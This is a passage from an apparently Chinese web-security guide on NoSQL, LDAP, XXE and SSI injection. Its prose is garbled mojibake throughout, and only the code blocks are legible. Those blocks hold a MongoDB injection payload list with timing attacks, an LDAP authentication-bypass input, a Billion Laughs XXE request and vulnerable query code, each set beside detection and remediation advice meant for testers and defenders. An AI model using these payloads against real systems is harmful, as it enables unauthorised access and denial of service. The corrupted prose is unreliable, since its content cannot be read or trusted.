é€’ç»™<code>$where</code>è¿ç®—ç¬¦çš„æ•°æ®ï¼Œåˆ™è¯¥æ”»å‡»è€…å¯ä»¥åŒ…å«ä»»æ„<code>JavaScript</code>ï¼Œä»¥å°†å…¶è¯„ä¼°ä¸º<code>MongoDB</code>æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ã€‚å¦‚æœç”¨æˆ·è¾“å…¥ä¸ç»è¿‡æ¸…ç†å°±ç›´æ¥ä¼ é€’åˆ°<code>MongoDB</code>æŸ¥è¯¢ä¸­ï¼Œåˆ™ä»¥ä¸‹ä»£ç ä¸­æš´éœ²äº†ä¸€ä¸ªç¤ºä¾‹æ¼æ´ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCollection.find( &#123; active: true,  $where: function() &#123; return obj.credits - obj.debits &lt; $userInput; &#125; &#125; );;</span><br></pre></td></tr></table></figure><p>â€‹    ä¸æµ‹è¯•å…¶ä»–ç±»å‹çš„æ³¨å…¥ä¸€æ ·ï¼Œä¸éœ€è¦å®Œå…¨åˆ©ç”¨æ­¤æ¼æ´æ¥è¯æ˜é—®é¢˜ã€‚é€šè¿‡æ³¨å…¥ä¸ç›®æ ‡APIè¯­è¨€ç›¸å…³çš„ç‰¹æ®Šå­—ç¬¦å¹¶è§‚å¯Ÿç»“æœï¼Œæµ‹è¯•äººå‘˜å¯ä»¥ç¡®å®šåº”ç”¨ç¨‹åºæ˜¯å¦æ­£ç¡®æ¸…    é™¤äº†è¾“å…¥ã€‚ä¾‹å¦‚ï¼Œåœ¨MongoDBä¸­ï¼Œå¦‚æœæœªç»è¿‡æ»¤ä¼ é€’åŒ…å«ä»¥ä¸‹ä»»ä½•ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šè§¦å‘æ•°æ®åº“é”™è¯¯ã€‚<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' " \ ; &#123; &#125;</span><br></pre></td></tr></table></figure></p><p>â€‹    ä½¿ç”¨æ™®é€šçš„<code>SQL</code>æ³¨å…¥ï¼Œç±»ä¼¼çš„æ¼æ´å°†ä½¿æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„SQLå‘½ä»¤-éšæ„å…¬å¼€æˆ–å¤„ç†æ•°æ®ã€‚ä½†æ˜¯ï¼Œç”±äº<code>JavaScript</code>æ˜¯ä¸€ç§åŠŸèƒ½å…¨é¢çš„è¯­è¨€ï¼Œå› æ­¤ï¼Œè¿™ä¸ä»…ä½¿æ”»    å‡»è€…å¯ä»¥æ“çºµæ•°æ®ï¼Œè¿˜å¯ä»¥è¿è¡Œä»»æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æ¼æ´ä¸ä»…ä¼šåœ¨æµ‹è¯•æ—¶å¼•èµ·é”™è¯¯ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦æ¥åˆ¶ä½œæœ‰æ•ˆçš„<code>JavaScript</code>ã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p><code>MongoDB NoSQL</code>æ³¨å…¥å¸¸è§æµ‹è¯•<code>payloads</code>ï¼š </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">true, $where: '1 == 1'</span><br><span class="line">, $where: '1 == 1'</span><br><span class="line">$where: '1 == 1'</span><br><span class="line">', $where: '1 == 1</span><br><span class="line">1, $where: '1 == 1'</span><br><span class="line">&#123; $ne: 1 &#125;</span><br><span class="line">', $or: [ &#123;&#125;, &#123; 'a':'a</span><br><span class="line">' &#125; ], $comment:'successful MongoDB injection'</span><br><span class="line">db.injection.insert(&#123;success:1&#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;);return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1</span><br><span class="line">|| 1==1</span><br><span class="line">' &amp;&amp; this.password.match(/.*/)//+%00</span><br><span class="line">' &amp;&amp; this.passwordzz.match(/.*/)//+%00</span><br><span class="line">'%20%26%26%20this.password.match(/.*/)//+%00</span><br><span class="line">'%20%26%26%20this.passwordzz.match(/.*/)//+%00</span><br><span class="line">&#123;$gt: ''&#125;</span><br><span class="line">[$ne]=1</span><br><span class="line">';sleep(5000);</span><br><span class="line">';it=new%20Date();do&#123;pt=new%20Date();&#125;while(pt-it&lt;5000);</span><br></pre></td></tr></table></figure></li><li><p>åœ¨<code>MongoDB</code>ä¸­æµ‹è¯•<code>NoSQL</code>æ³¨å…¥æ¼æ´</p><p><code>MongoDB API</code>éœ€è¦<code>BSON</code>ï¼ˆäºŒè¿›åˆ¶<code>JSON</code>ï¼‰è°ƒç”¨ï¼Œå¹¶åŒ…æ‹¬ä¸€ä¸ªå®‰å…¨çš„<code>BSON</code>æŸ¥è¯¢ç»„è£…å·¥å…·ã€‚ä½†æ˜¯ï¼Œæ ¹æ®<code>MongoDB</code>æ–‡æ¡£ï¼Œåœ¨å‡ ä¸ªæ›¿ä»£æŸ¥è¯¢å‚æ•°ä¸­å…è®¸æœªåºåˆ—åŒ–çš„<code>JSON</code>å’Œ<code>JavaScript</code>è¡¨è¾¾å¼ã€‚å…è®¸ä»»æ„<code>JavaScript</code>è¾“å…¥çš„æœ€å¸¸ç”¨çš„<code>API</code>è°ƒç”¨æ˜¯<code>$where</code>è¿ç®—ç¬¦ã€‚</p><p>ç”±äº<code>$where</code>åœ¨<code>SQL</code>ä¸­ï¼Œ<code>MongoDB</code>è¿ç®—ç¬¦é€šå¸¸ç”¨ä½œç®€å•çš„è¿‡æ»¤æˆ–æ£€æŸ¥ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCollection.find( &#123; $where:  "this.credits == this.debits" &#125; );</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>ä¸ºäº†é¿å…<code>NoSQL</code>æ³¨å…¥ï¼Œå¿…é¡»å§‹ç»ˆå°†ç”¨æˆ·è¾“å…¥è§†ä¸ºä¸å—ä¿¡ä»»ã€‚å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥éªŒè¯ç”¨æˆ·è¾“å…¥ï¼š</p></li><li><p>ä½¿ç”¨è¾“å…¥è¿‡æ»¤åº“ï¼Œä¾‹å¦‚<code>mongo-sanitize</code>æˆ–<code>mongoose</code>ã€‚</p></li><li><p>å¦‚æœæ‰¾ä¸åˆ°é€‚åˆå¼€å‘ç¯å¢ƒçš„åº“ï¼Œè¯·å°†ç”¨æˆ·è¾“å…¥è½¬æ¢ä¸ºæœŸæœ›çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p></li><li><p>åœ¨<code>MongoDB</code>çš„æƒ…å†µä¸‹ï¼Œåˆ‡å‹¿åœ¨ç”¨æˆ·è¾“å…¥ä¸­ä½¿ç”¨<code>where</code>ï¼Œ<code>mapReduce</code>æˆ–<code>group</code>è¿ç®—ç¬¦ï¼Œå› ä¸ºè¿™äº›è¿ç®—ç¬¦ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ³¨å…¥<code>JavaScript</code>ï¼Œå› æ­¤æ¯”å…¶ä»–è¿ç®—ç¬¦æ›´åŠ å±é™©ã€‚</p></li><li><p>ä¸ºäº†åŠ å¼ºå®‰å…¨æ€§ï¼Œå¯ä»¥å°†<code>mongod.conf</code>çš„<code>javascriptEnabled</code>è®¾ç½®ä¸º<code>false</code>ã€‚</p></li><li><p>ä»¥æœ€ä½çš„æƒé™è¿è¡Œåº”ç”¨ç¨‹åºï¼Œä»¥ä¾¿å³ä½¿è¢«åˆ©ç”¨ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•è®¿é—®å…¶ä»–èµ„æºã€‚</p></li></ul><h3 id="LDAPæ³¨å…¥"><a href="#LDAPæ³¨å…¥" class="headerlink" title="LDAPæ³¨å…¥"></a>LDAPæ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><code>LDAP</code>ï¼ˆè½»å‹ç›®å½•è®¿é—®åè®®ï¼‰æ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»ï¼Œç”¨äºåˆ©ç”¨åŸºäº<code>Web</code>çš„åº”ç”¨ç¨‹åºæ„å»ºåŸºäºç”¨æˆ·è¾“å…¥çš„<code>LDAP</code>è¯­å¥ã€‚å½“åº”ç”¨ç¨‹åºæ— æ³•æ­£ç¡®æ¸…ç†ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ä»£ç†ä¿®æ”¹<code>LDAP</code>è¯­å¥ã€‚è¿™å¯èƒ½å¯¼è‡´æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚å‘æœªç»æˆæƒçš„æŸ¥è¯¢æˆäºˆæƒé™ä»¥åŠ<code>LDAP</code>æ ‘ä¸­çš„å†…å®¹ä¿®æ”¹ã€‚<code>SQL</code>æ³¨å…¥ä¸­å¯ç”¨çš„ç›¸åŒé«˜çº§åˆ©ç”¨æŠ€æœ¯å¯ä»¥ç±»ä¼¼åœ°åº”ç”¨äº<code>LDAP</code>æ³¨å…¥ä¸­ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>æ”»å‡»è€…å¯ä»¥æ›´æ”¹<code>LDAP</code>æŸ¥è¯¢çš„è¾“å…¥ï¼Œè¯¥è¾“å…¥å…è®¸æ‰§è¡Œæœªæˆæƒçš„ä»£ç æˆ–å‘½ä»¤ï¼Œå…è®¸è¯»å–æˆ–ä¿®æ”¹æ•æ„Ÿæ•°æ®æˆ–å¯¼è‡´å…¶ä»–æ„å¤–è¡Œä¸ºã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä»¥ä¸‹ä»£ç ä½¿ç”¨ç”¨æˆ·è¾“å…¥åœ°å€æ•°æ®æ„é€ <code>LDAP</code>æŸ¥è¯¢ï¼šç”±äºä»£ç æ— æ³•ä¸­å’Œç”¨äºæ„é€ æŸ¥è¯¢çš„åœ°å€å­—ç¬¦ä¸²ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æä¾›åŒ…å«å…¶ä»–<code>LDAP</code>æŸ¥è¯¢çš„åœ°å€ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Example Language: Java </span><br><span class="line">context = new InitialDirContext(env);</span><br><span class="line">String searchFilter = &quot;StreetAddress=&quot; + address;</span><br><span class="line">NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);</span><br></pre></td></tr></table></figure></p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><p>åœºæ™¯1ï¼šæœç´¢è¿‡æ»¤å™¨</p><p>â€‹    å‡è®¾æˆ‘ä»¬ä¸€ä¸ª<code>Web</code>åº”ç”¨çš„æœç´¢è¿‡æ»¤å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchfilter="(cn="+user+")"</span><br></pre></td></tr></table></figure></p><p>â€‹    å¯ä»¥é€šè¿‡<code>HTTP</code>è¯·æ±‚å®ä¾‹åŒ–ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/ldapsearch?user=John</span><br></pre></td></tr></table></figure></p><p>â€‹    å¦‚æœå°†å€¼<code>John</code>æ›¿æ¢ä¸º<code>*</code>ï¼Œåˆ™é€šè¿‡å‘é€è¯·æ±‚ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/ldapsearch?user=*</span><br></pre></td></tr></table></figure></p><p>â€‹    è¿‡æ»¤å™¨å¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchfilter="(cn=*)"</span><br></pre></td></tr></table></figure></p><p>â€‹    åŒ¹é…å…·æœ‰â€œ<code>cn</code>â€å±æ€§çš„æ¯ä¸ªå¯¹è±¡ç­‰äºä»»ä½•å†…å®¹ã€‚</p><p>â€‹    å¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°<code>LDAP</code>æ³¨å…¥çš„æ”»å‡»ï¼Œå®ƒå°†æ˜¾ç¤ºéƒ¨åˆ†æˆ–å…¨éƒ¨ç”¨æˆ·å±æ€§ï¼Œå…·ä½“å–å†³äºåº”ç”¨ç¨‹åºçš„æ‰§è¡Œæµç¨‹å’Œ<code>LDAP</code>è¿æ¥çš„ç”¨æˆ·çš„æƒé™ã€‚</p><p>â€‹    æµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨è¯•é”™æ–¹æ³•ï¼Œé€šè¿‡åœ¨å‚æ•°æ’å…¥â€œ<code>(|&amp;*</code>â€å’Œå…¶ä»–å­—ç¬¦ï¼Œä»¥æ£€æŸ¥é”™è¯¯çš„åº”ç”¨ç¨‹åºã€‚</p><p>åœºæ™¯2ï¼šç™»å½•</p><p>â€‹    å¦‚æœ<code>Web</code>åº”ç”¨ç¨‹åºåœ¨ç™»å½•è¿‡ç¨‹ä¸­ä½¿ç”¨<code>LDAP</code>æ¥æ£€æŸ¥ç”¨æˆ·å‡­æ®ï¼Œå¹¶ä¸”å®¹æ˜“å—åˆ°<code>LDAP</code>æ³¨å…¥çš„å½±å“ï¼Œåˆ™å¯ä»¥é€šè¿‡æ³¨å…¥å§‹ç»ˆä¸ºçœŸçš„<code>LDAP</code>æŸ¥è¯¢ï¼ˆä»¥ç±»ä¼¼äº<code>SQL</code>å’Œ<code>XPATH</code>æ³¨å…¥çš„æ–¹å¼ï¼‰æ¥ç»•è¿‡èº«ä»½éªŒè¯æ£€æŸ¥ã€‚</p><p>â€‹    å‡è®¾<code>Web</code>åº”ç”¨ç¨‹åºä½¿ç”¨è¿‡æ»¤å™¨æ¥åŒ¹é…<code>LDAP</code>ç”¨æˆ·/å¯†ç å¯¹ã€‚<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchlogin= "(&amp;(uid="+user+")(userPassword=&#123;MD5&#125;"+base64(pack("H*",md5(pass)))+"))";</span><br></pre></td></tr></table></figure></p><p>â€‹    é€šè¿‡ä½¿ç”¨ä»¥ä¸‹å€¼ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user=*)(uid=*))(|(uid=*</span><br><span class="line">pass=password</span><br></pre></td></tr></table></figure></p><p>â€‹    æœç´¢è¿‡æ»¤å™¨å°†å¯¼è‡´ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchlogin="(&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=&#123;MD5&#125;X03MO1qnZdYdgyfeuILPmQ==))";</span><br></pre></td></tr></table></figure></p><p>â€‹    è¿™æ˜¯æ­£ç¡®çš„ï¼Œè€Œä¸”æ°¸è¿œéƒ½æ˜¯æ­£ç¡®çš„ã€‚è¿™æ ·ï¼Œæµ‹è¯•äººå‘˜å°†ä»¥<code>LDAP</code>æ ‘ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·èº«ä»½è·å¾—ç™»å½•çŠ¶æ€ã€‚</p><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>é˜²æ­¢<code>LDAP</code>æ³¨å…¥çš„æœ€ä½³æ–¹æ³•æ˜¯ä½¿ç”¨å¿…è¦çš„éªŒè¯æ–¹æ¡ˆï¼Œä»¥ç¡®ä¿è¿›å…¥æŸ¥è¯¢çš„æ•°æ®ä¸åŒ…å«ä»»ä½•æ”»å‡»ã€‚ä½†æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæœ‰å¿…è¦åœ¨ä¼ é€’ç»™<code>LDAP</code>æŸ¥è¯¢çš„è¾“å…¥ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨è½¬ä¹‰å¯ä»¥é˜²æ­¢<code>LDAP</code>è§£é‡Šå™¨è®¤ä¸ºé‚£äº›ç‰¹æ®Šå­—ç¬¦å®é™…ä¸Šæ˜¯<code>LDAP</code>æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ã€‚</p></li><li><p>åœ¨<code>LDAP</code>çš„ç›®å½•ç»“æ„çš„<code>DN</code>ï¼ˆ<code>Distinguished Name</code>ï¼‰ä¸­éœ€è¦ä½¿ç”¨â€œ\â€è½¬ä¹‰çš„ç‰¹æ®Šå­—ç¬¦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">!</span><br><span class="line">|</span><br><span class="line">=</span><br><span class="line"><span class="tag">&lt;</span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">,</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">"</span><br><span class="line">'</span><br><span class="line">;</span><br></pre></td></tr></table></figure></li><li><p>éœ€è¦ä½¿ç”¨{\ASCII}è½¬ä¹‰çš„ç‰¹æ®Šå­—ç¬¦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(     &#123;\28&#125;</span><br><span class="line">)     &#123;\29&#125;</span><br><span class="line">\     &#123;\5c&#125;</span><br><span class="line">*     &#123;\2a&#125;</span><br><span class="line">/     &#123;\2f&#125;</span><br><span class="line">NUL   &#123;\0&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXXEï¼‰"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXXEï¼‰" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXXEï¼‰"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXXEï¼‰</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><code>XML</code>å¤–éƒ¨å®ä½“æ”»å‡»æ˜¯é’ˆå¯¹åº”ç”¨ç¨‹åºè§£æ<code>XML</code>è¾“å…¥ç±»å‹çš„æ”»å‡»ã€‚å½“å¼±é…ç½®çš„<code>XML</code>è§£æå™¨å¤„ç†åŒ…å«å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨çš„<code>XML</code>è¾“å…¥æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤æ”»å‡»ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>æ³„éœ²æœºå¯†æ•°æ®ã€‚</p></li><li><p>æ‹’ç»æœåŠ¡ã€‚</p></li><li><p>ä¼ªé€ æœåŠ¡å™¨ç«¯è¯·æ±‚ï¼ˆ<code>SSRF</code>ï¼‰ã€‚</p></li><li><p>å‚æ•°å®ä½“ï¼Œè¯»å–ä»»æ„æ–‡ä»¶ã€‚</p></li><li><p>é€šè¿‡<code>Xinclude</code> åŒ…å«å¤–éƒ¨èµ„æºã€‚</p></li><li><p>è¿›è¡Œå†…ç½‘ç«¯å£æ‰«ææ¢æµ‹ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼š<code>Billion Laughs</code> æ”»å‡»ï¼Œæ­¤æ”»å‡»ä¼šä½¿<code>XML</code>è§£æå™¨çš„å†…å­˜è¿‡è½½ï¼Œä»è€Œé€ æˆç›®æ ‡æ‹’ç»æœåŠ¡ï¼š</p><p>è¯·æ±‚åŒ…</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://example.com/xml</span> HTTP/1.1</span><br><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ELEMENT foo ANY&gt;</span><br><span class="line">  &lt;!ENTITY bar "World "&gt;</span><br><span class="line">  &lt;!ENTITY t1 "&amp;bar;&amp;bar;"&gt;</span><br><span class="line">  &lt;!ENTITY t2 "&amp;t1;&amp;t1;&amp;t1;&amp;t1;"&gt;</span><br><span class="line">  &lt;!ENTITY t3 "&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">  Hello &amp;t3;</span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>å“åº”åŒ…</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 <span class="number">200</span> OK</span><br><span class="line"> </span><br><span class="line">Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æºä»£ç å®¡è®¡ï¼š</p><p>å¦‚æœä»¥ä¸‹<code>Java API</code>é…ç½®ä¸æ­£ç¡®ï¼Œåˆ™ç›®æ ‡ç³»ç»Ÿå¯èƒ½å®¹æ˜“å—åˆ°<code>XXE</code>çš„æ”»å‡»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.DocumentBuildFactory</span><br><span class="line">org.xml.sax.EntityResolver</span><br><span class="line">org.dom4j.*</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">TransformerFactory</span><br><span class="line">SAXReader</span><br><span class="line">DocumentHelper</span><br><span class="line">SAXBuilder</span><br><span class="line">SAXParserFactory</span><br><span class="line">XMLReaderFactory</span><br><span class="line">XMLInputFactory</span><br><span class="line">SchemaFactory</span><br><span class="line">DocumentBuilderFactoryImpl</span><br><span class="line">SAXTransformerFactory</span><br><span class="line">DocumentBuilderFactoryImpl</span><br><span class="line">XMLReader</span><br><span class="line">Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser</span><br></pre></td></tr></table></figure></li></ul><p>  æ£€æŸ¥æºä»£ç æ˜¯å¦å°†<code>docType</code>ï¼Œå¤–éƒ¨<code>DTD</code>å’Œå¤–éƒ¨å‚æ•°å®ä½“è®¾ç½®ä¸ºç¦æ­¢ä½¿ç”¨ã€‚</p><p>  <code>C</code>è¯­è¨€<code>xml</code>è§£æåº“æºä»£ç æ£€æŸ¥å…³é”®å­—ï¼š</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile,xmlReadIO,xmlReadMemory,xmlCtxtReadDoc,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO</span><br><span class="line">libxerces-c: XercesDOMParser,SAXParser,SAX2XMLReader</span><br></pre></td></tr></table></figure><p>  ä½¿ç”¨<code>wfuzz</code>å·¥å…·ï¼š<code>https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt</code></p><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>é˜²æ­¢<code>XXE</code>çš„æœ€å®‰å…¨æ–¹æ³•å§‹ç»ˆæ˜¯å®Œå…¨ç¦ç”¨<code>DTD</code>ï¼ˆå¤–éƒ¨å®ä½“ï¼‰ã€‚</p></li><li><p>ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li></ul><p>è¿‡æ»¤ç”¨æˆ·æäº¤çš„<code>XML</code>æ•°æ®ï¼š<code>&lt;!DOCTYPE</code>å’Œ<code>&lt;!ENTITY</code>ï¼Œæˆ–è€…ï¼Œ<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ã€‚</p><h3 id="SSIæ³¨å…¥"><a href="#SSIæ³¨å…¥" class="headerlink" title="SSIæ³¨å…¥"></a>SSIæ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p><code>SSI</code>æ˜¯<code>Web</code>åº”ç”¨ç¨‹åºä¸Šå­˜åœ¨çš„æŒ‡ä»¤ï¼Œç”¨äºå‘HTMLé¡µé¢æä¾›åŠ¨æ€å†…å®¹ã€‚å®ƒä»¬ä¸<code>CGI</code>ç›¸ä¼¼ï¼Œé™¤äº†<code>SSI</code>ç”¨äºåœ¨åŠ è½½å½“å‰é¡µé¢ä¹‹å‰æˆ–åœ¨å¯è§†åŒ–é¡µé¢æ—¶æ‰§è¡ŒæŸäº›æ“ä½œã€‚ä¸ºæ­¤ï¼Œ<code>Web</code>æœåŠ¡å™¨åœ¨å°†é¡µé¢æä¾›ç»™ç”¨æˆ·ä¹‹å‰å…ˆåˆ†æ<code>SSI</code>ã€‚</p></li><li><p>æœåŠ¡å™¨ç«¯åŒ…å«æ”»å‡»å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢ä¸­æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç æ¥åˆ©ç”¨<code>Web</code>åº”ç”¨ç¨‹åºã€‚å¯ä»¥é€šè¿‡æ“çºµåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„SSIæ¥åˆ©ç”¨å®ƒï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç”¨æˆ·è¾“å…¥å­—æ®µæ¥å¼ºåˆ¶ä½¿ç”¨å®ƒã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>æ”»å‡»è€…å¯ä»¥è®¿é—®æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œæœªç»æˆæƒçš„ä»£ç æˆ–å‘½ä»¤ã€‚<code>SSI</code>ä¼ªæŒ‡ä»¤æ³¨å…¥åˆ°è¾“å…¥å­—æ®µä¸­ï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°<code>Web</code>æœåŠ¡å™¨ã€‚<code>Web</code>æœåŠ¡å™¨åœ¨æä¾›é¡µé¢ä¹‹å‰ä¼šè§£æå¹¶æ‰§è¡ŒæŒ‡ä»¤ã€‚ç„¶åï¼Œä¸‹æ¬¡ä¸ºç”¨æˆ·çš„æµè§ˆå™¨åŠ è½½é¡µé¢æ—¶ï¼Œæ”»å‡»ç»“æœå°†å¯è§ã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šæ 